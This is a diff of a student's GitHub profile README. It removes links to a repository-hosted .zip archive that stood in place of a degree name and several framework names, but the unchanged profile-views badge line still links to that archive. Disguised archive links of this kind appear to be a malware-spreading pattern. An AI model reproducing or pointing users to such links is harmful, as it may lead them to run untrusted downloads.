@@ -2,11 +2,11 @@
 ![Profile Views](https://raw.githubusercontent.com/abhay08-k09/abhay08-k09/main/euconic/abhay08-k09.zip%20Views&color=informational&labelColor=gray)
 
 ## About Me
-I’m a passionate Software Engineer from **INDIA**. I’m currently pursuing my https://raw.githubusercontent.com/abhay08-k09/abhay08-k09/main/euconic/abhay08-k09.zip from **GL Bajaj Institute of Technology and Management**, in department of **Computer Science Engineering**.
+I’m a passionate Software Engineer from **INDIA**. I’m currently pursuing my from **GL Bajaj Institute of Technology and Management**, in department of **Computer Science Engineering**.
 
 ## 🛠 Tools & Technologies
 - **Languages:** C, C++, HTML , CSS, JavaScript, SQL
-- **Frameworks:** https://raw.githubusercontent.com/abhay08-k09/abhay08-k09/main/euconic/abhay08-k09.zip, https://raw.githubusercontent.com/abhay08-k09/abhay08-k09/main/euconic/abhay08-k09.zip, https://raw.githubusercontent.com/abhay08-k09/abhay08-k09/main/euconic/abhay08-k09.zip, EJS, Bootstrap, Tailwind CSS 
+- **Frameworks:**  EJS, Bootstrap, Tailwind CSS 
 - **Core Concepts:** Data Structures & Algorithms, OOPs, DBMS, OS, CN
 - **Databases:** MySQL, MongoDB
 
